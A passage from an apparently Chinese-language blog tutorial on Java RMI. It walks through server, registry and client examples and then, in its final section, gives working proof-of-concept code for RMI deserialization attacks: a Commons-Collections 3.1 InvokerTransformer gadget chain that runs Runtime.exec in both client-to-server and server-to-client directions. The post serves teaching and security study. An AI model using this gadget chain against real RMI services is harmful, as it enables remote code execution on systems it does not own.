class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="开发接口的实现类"><a href="#开发接口的实现类" class="headerlink" title="开发接口的实现类"></a>开发接口的实现类</h2><p>建立PersonServiceImpl实现远程接口，注意此为远程对象实现类，需要继承UnicastRemoteObject（如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersonServiceImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">PersonService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">PersonServiceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">      <span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;PersonEntity&gt; <span class="title">GetList</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        System.out.println(<span class="string">"Get Person Start!"</span>);</span><br><span class="line">        List&lt;PersonEntity&gt; personList = <span class="keyword">new</span> LinkedList&lt;PersonEntity&gt;();</span><br><span class="line"></span><br><span class="line">        PersonEntity person1 = <span class="keyword">new</span> PersonEntity();</span><br><span class="line">        person1.setAge(<span class="number">3</span>);</span><br><span class="line">        person1.setId(<span class="number">0</span>);</span><br><span class="line">        person1.setName(<span class="string">"0range"</span>);</span><br><span class="line">        personList.add(person1);</span><br><span class="line"></span><br><span class="line">        PersonEntity person2 = <span class="keyword">new</span> PersonEntity();</span><br><span class="line">        person2.setAge(<span class="number">18</span>);</span><br><span class="line">        person2.setId(<span class="number">1</span>);</span><br><span class="line">        person2.setName(<span class="string">"Wind"</span>);</span><br><span class="line">        personList.add(person2);</span><br><span class="line">        <span class="keyword">return</span> personList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="创建Server和Registry"><a href="#创建Server和Registry" class="headerlink" title="创建Server和Registry"></a>创建Server和Registry</h2><p>其实Server和Registry可以单独运行创建，其中Registry可通过代码启动也可通过rmiregistry命令启动，这里只进行简单的演示，将Server和Registry的创建、对象绑定注册表等都写到一块，且Registry直接代码启动：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Program</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PersonService personService=<span class="keyword">new</span> PersonServiceImpl();</span><br><span class="line">            <span class="comment">//注册通讯端口</span></span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">9898</span>);</span><br><span class="line">            <span class="comment">//注册通讯路径</span></span><br><span class="line">            Naming.rebind(<span class="string">"rmi://127.0.0.1:9898/PersonService"</span>, personService);</span><br><span class="line">            System.out.println(<span class="string">"Service Start!"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="创建客户端并查找调用远程方法"><a href="#创建客户端并查找调用远程方法" class="headerlink" title="创建客户端并查找调用远程方法"></a>创建客户端并查找调用远程方法</h2><p>这里我们通过Naming.lookup()来查找RMI Server端的远程对象并获取到本地客户端环境中输出出来：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//调用远程对象，注意RMI路径与接口必须与服务器配置一致</span></span><br><span class="line">            PersonService personService=(PersonService) Naming.lookup(<span class="string">"rmi://127.0.0.1:9898/PersonService"</span>);</span><br><span class="line">            List&lt;PersonEntity&gt; personList=personService.GetList();</span><br><span class="line">            <span class="keyword">for</span>(PersonEntity person:personList)&#123;</span><br><span class="line">                System.out.println(<span class="string">"ID:"</span>+person.getId()+<span class="string">" Age:"</span>+person.getAge()+<span class="string">" Name:"</span>+person.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception ex)&#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后，我们看下模拟运行的场景。</p>
<p>先启动Server和Register，开启成功后显示“Server Start!”，然后运行Client程序，可以看到客户端成功获取到了在Register注册的Server中的远程对象的内容：</p>
<p><img src="../images/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/image-20200625153417419.png" alt="image-20200625153417419"></p>
<p><img src="../images/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/image-20200625153430585.png" alt="image-20200625153430585"></p>
<h2 id="几个函数"><a href="#几个函数" class="headerlink" title="几个函数"></a>几个函数</h2><p>这里小结下几个函数：</p>
<ul>
<li>bind(String name, Object obj)：注册对象，把对象和一个名字name绑定，这里的name其实就是URL格式。如果该名字已经与其他对象绑定，则抛出NameAlreadyBoundException错误；</li>
<li>rebind(String name, Object obj)：注册对象，把对象和一个名字name绑定。如果改名字已经与其他对象绑定，不会抛出NameAlreadyBoundException错误，而是把当前参数obj指定的对象覆盖原先的对象（更暴力）；</li>
<li>lookup(String name)：查找对象，返回与参数name指定的名字所绑定的对象；</li>
<li>unbind(String name)：注销对象，取消对象与名字的绑定；</li>
</ul>
<h1 id="经典例子"><a href="#经典例子" class="headerlink" title="经典例子"></a>经典例子</h1><p>这里我再写一个例子，用于强化。</p>
<p>首先我还是生成一个接口，叫它<code>IRemoteMath</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 必须继承Remote接口。</span></span><br><span class="line"><span class="comment"> * 所有参数和返回类型必须序列化(因为要网络传输)。</span></span><br><span class="line"><span class="comment"> * 任意远程对象都必须实现此接口。</span></span><br><span class="line"><span class="comment"> * 只有远程接口中指定的方法可以被调用。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IRemoteMath</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 所有方法必须抛出RemoteException</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">add</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">double</span> b)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">subtract</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">double</span> b)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li>这个远程接口必须继承Remote类；</li>
<li>内部抽象方法必须都有throw RemoteException</li>
</ul>
<p>接下来我写一个接口的实现类，叫做<code>RemoteMath</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 服务器端实现远程接口。</span></span><br><span class="line"><span class="comment"> * 必须继承UnicastRemoteObject，以允许JVM创建远程的存根/代理。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteMath</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">IRemoteMath</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> numberOfComputations;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">RemoteMath</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        numberOfComputations = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">add</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">double</span> b)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        numberOfComputations++;</span><br><span class="line">        System.out.println(<span class="string">"Number of computations performed so far = "</span></span><br><span class="line">                + numberOfComputations);</span><br><span class="line">        <span class="keyword">return</span> (a+b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">subtract</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">double</span> b)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        numberOfComputations++;</span><br><span class="line">        System.out.println(<span class="string">"Number of computations performed so far = "</span></span><br><span class="line">                + numberOfComputations);</span><br><span class="line">        <span class="keyword">return</span> (a-b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li>这个类其实就是接口实现类<ul>
<li>实现接口的全部方法，这个不必多说@overide</li>
<li>必须继承UnicastRemoteObject</li>
</ul>
</li>
<li>用它来实现接口中声明的所有抽象方法，它就是接口的实现类。</li>
</ul>
<p>接下来是第一个关键角色Server，这里我是把Server和Client合在一起，实现如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 创建RemoteMath类的实例并在rmiregistry中注册。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 注册远程对象,向客户端提供远程对象服务。</span></span><br><span class="line">            <span class="comment">// 远程对象是在远程服务上创建的，你无法确切地知道远程服务器上的对象的名称，</span></span><br><span class="line">            <span class="comment">// 但是,将远程对象注册到RMI Registry之后,</span></span><br><span class="line">            <span class="comment">// 客户端就可以通过RMI Registry请求到该远程服务对象的stub，</span></span><br><span class="line">            <span class="comment">// 利用stub代理就可以访问远程服务对象了。</span></span><br><span class="line">            IRemoteMath remoteMath = <span class="keyword">new</span> RemoteMath();</span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry();</span><br><span class="line">            registry.bind(<span class="string">"Compute"</span>, remoteMath);</span><br><span class="line">            System.out.println(<span class="string">"Math server ready"</span>);</span><br><span class="line">            <span class="comment">// 如果不想再让该对象被继续调用，使用下面一行</span></span><br><span class="line">            <span class="comment">// UnicastRemoteObject.unexportObject(remoteMath, false);</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li>在这里，首先<code>接口=new 实现类</code>，用到了Java多态，从这里开始也是用接口去注册，用接口去迎接；</li>
<li>接下来注册一个端口，默认是1099；</li>
<li>接下来将名字与接口实现类对象绑定，上面就是“Compute”和remoteMath</li>
<li>之后客户端就可以通过RMI Registry请求到该远程服务对象的stub了</li>
</ul>
<p>客户端实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MathClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 如果RMI Registry就在本地机器上，URL就是:rmi://localhost:1099/hello</span></span><br><span class="line">            <span class="comment">// 否则，URL就是：rmi://RMIService_IP:1099/hello</span></span><br><span class="line">            <span class="comment">//Registry registry = LocateRegistry.getRegistry("localhost");</span></span><br><span class="line">            <span class="comment">// 从Registry中检索远程对象的存根/代理</span></span><br><span class="line">            <span class="comment">//IRemoteMath remoteMath = (IRemoteMath) registry.lookup("Compute");</span></span><br><span class="line">            IRemoteMath remoteMath=(IRemoteMath) Naming.lookup(<span class="string">"rmi://127.0.0.1:1099/Compute"</span>);</span><br><span class="line">            <span class="comment">// 调用远程对象的方法</span></span><br><span class="line">            <span class="keyword">double</span> addResult = remoteMath.add(<span class="number">5.0</span>, <span class="number">3.0</span>);</span><br><span class="line">            System.out.println(<span class="string">"5.0 + 3.0 = "</span> + addResult);</span><br><span class="line">            <span class="keyword">double</span> subResult = remoteMath.subtract(<span class="number">5.0</span>, <span class="number">3.0</span>);</span><br><span class="line">            System.out.println(<span class="string">"5.0 - 3.0 = "</span> + subResult);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li>首先Naming.lookup去寻找Compute服务，用接口去迎接，拿到远程对象</li>
<li>拿到远程对象之后，通过它去调用远程方法，实现整个流程</li>
</ul>
<p>结果截图：</p>
<p><img src="../images/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/image-20200625223328712.png" alt="image-20200625223328712"></p>
<p><img src="../images/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/image-20200625223336217.png" alt="image-20200625223336217"></p>
<h2 id="多说两句"><a href="#多说两句" class="headerlink" title="多说两句"></a>多说两句</h2><p>这里说明一下，当执行<code>Registry registry = LocateRegistry.createRegistry(1099);</code>的时候，返回的registry对象类是sun.rmi.registry.RegistryImpl，其内部的ref，也就是sun.rmi.server.UnicastServerRef，持有sun.rmi.registry.RegistryImpl_Skel类型的对象变量ref。</p>
<p>而服务端以及客户端，执行<code>Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);</code>返回的是sun.rmi.registry.RegistryImpl_Stub。</p>
<p>当服务端对实现了HelloService接口并继承了UnicastRemoteObject类的HelloServiceImpl实例化时，在其父类UnicastRemoteObject中，会对当前对象进行导出，返回一个当前对象的stub，也就是HelloService_stub，在其执行<code>registry.bind(&quot;hello&quot;, helloService);</code>的时候，会把这个stub对象，发送到RMI Registry存根。</p>
<p>当客户端执行<code>HelloService helloService = (HelloService) registry.lookup(&quot;hello&quot;)</code>的时候，就会从RMI Registry获取到服务端存进去的stub。</p>
<p>接着客户端就可以通过stub对象，对服务端发起一个远程方法调用<code>helloService.sayHello()</code>，stub对象内部存储了如何跟服务端联系的信息，以及封装了RMI的通讯实现细节，对开发者完全透明。</p>
<h1 id="RMI攻击实例"><a href="#RMI攻击实例" class="headerlink" title="RMI攻击实例"></a>RMI攻击实例</h1><h2 id="定义一个接口"><a href="#定义一个接口" class="headerlink" title="定义一个接口"></a>定义一个接口</h2><p><code>sayHello</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">RemoteHello</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    <span class="function">String <span class="title">exp1</span><span class="params">(Object work)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    <span class="function">Object <span class="title">exp2</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="定义接口实现类"><a href="#定义接口实现类" class="headerlink" title="定义接口实现类"></a>定义接口实现类</h2><p>其中：</p>
<p>exp1是客户端攻击服务端接口；</p>
<p>exp2是服务端攻击客户端接口；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteHelloImpl</span> <span class="keyword">implements</span> <span class="title">RemoteHello</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format</span><br><span class="line">          (<span class="string">"Hello, %s!"</span>, name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">exp1</span><span class="params">(Object exp)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"exp1 is "</span> + exp);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"exp1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">exp2</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"exp2"</span>);</span><br><span class="line">        <span class="keyword">return</span> payload();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">payload</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">"value"</span>, <span class="string">"lala"</span>);</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">transformedMap</span>)</span>;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Server-amp-Registry"><a href="#Server-amp-Registry" class="headerlink" title="Server&amp;Registry"></a>Server&amp;Registry</h2><p>创建RMI Registry，创建远程对象，绑定Name和远程对象，运行RMI服务器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, MalformedURLException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//实例化对象</span></span><br><span class="line">            RemoteHello h = <span class="keyword">new</span> RemoteHelloImpl();</span><br><span class="line">            <span class="comment">//用于导出远程对象，将此服务转换为远程服务接口</span></span><br><span class="line">            RemoteHello skeleton = (RemoteHello) UnicastRemoteObject.exportObject(h, <span class="number">0</span>);</span><br><span class="line">            <span class="comment">//// 将RMI服务注册到1099端口:</span></span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            <span class="comment">// 注册此服务，服务名为"Hello":</span></span><br><span class="line">            <span class="comment">//Naming.rebind("rmi://127.0.0.1:1099/Hello", h);</span></span><br><span class="line">            Naming.rebind(<span class="string">"Hello"</span>, h);</span><br><span class="line">            System.out.println(<span class="string">"[*]Biding is OVER!"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException </span>&#123;</span><br><span class="line">        <span class="comment">// 连接到服务器localhost，端口1099:</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"localhost"</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 查找名称为"Hello"的服务并强制转型为Hello接口:</span></span><br><span class="line">        RemoteHello h = (RemoteHello) registry.lookup(<span class="string">"Hello"</span>);</span><br><span class="line">        <span class="comment">// 正常调用接口方法:</span></span><br><span class="line">        String rs = h.sayHello(<span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">// 打印调用结果:</span></span><br><span class="line">        System.out.println(rs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上为基本操作，接下来进行攻击。</p>
<p>JDK:1.7u21</p>
<p>JAR:Commons-Collections3.1</p>
<p>Maven;</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="客户端攻击服务器"><a href="#客户端攻击服务器" class="headerlink" title="客户端攻击服务器"></a>客户端攻击服务器</h2><p>先上代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC_Client2Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 连接到服务器localhost，端口1099:</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"localhost"</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 查找名称为"Hello"的服务并强制转型为Hello接口:</span></span><br><span class="line">        RemoteHello h = (RemoteHello) registry.lookup(<span class="string">"Hello"</span>);</span><br><span class="line">        <span class="comment">// 正常调用接口方法:</span></span><br><span class="line">        <span class="comment">//String rs = h.sayHello("rai4over");</span></span><br><span class="line">        String rs = h.exp1(payload());</span><br><span class="line">        <span class="comment">// 打印调用结果:</span></span><br><span class="line">        System.out.println(rs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">payload</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">"value"</span>, <span class="string">"lala"</span>);</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">transformedMap</span>)</span>;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如图：</p>
<p><img src="../images/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/image-20200627121658858.png" alt="image-20200627121658858"></p>
<p>如果客户端传递给服务端恶意序列化数据，服务端反序列化时调用<code>readObject</code>就会遭到攻击。</p>
<h2 id="服务器攻击客户端"><a href="#服务器攻击客户端" class="headerlink" title="服务器攻击客户端"></a>服务器攻击客户端</h2><p>反之，服务端同样可以通过恶意反序列化数据攻击客户端。</p>
<p>先上代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC_Server2Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 连接到服务器localhost，端口1099:</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"localhost"</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 查找名称为"Hello"的服务并强制转型为Hello接口:</span></span><br><span class="line">        RemoteHello h = (RemoteHello) registry.lookup(<span class="string">"Hello"</span>);</span><br><span class="line">        <span class="comment">// 正常调用接口方法:</span></span><br><span class="line">        <span class="comment">//String rs = h.sayHello("rai4over");</span></span><br><span class="line">        <span class="comment">//String rs = h.exp1(payload());</span></span><br><span class="line">        Object rs = h.exp2();</span><br><span class="line">        <span class="comment">// 打印调用结果:</span></span><br><span class="line">        System.out.println(rs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

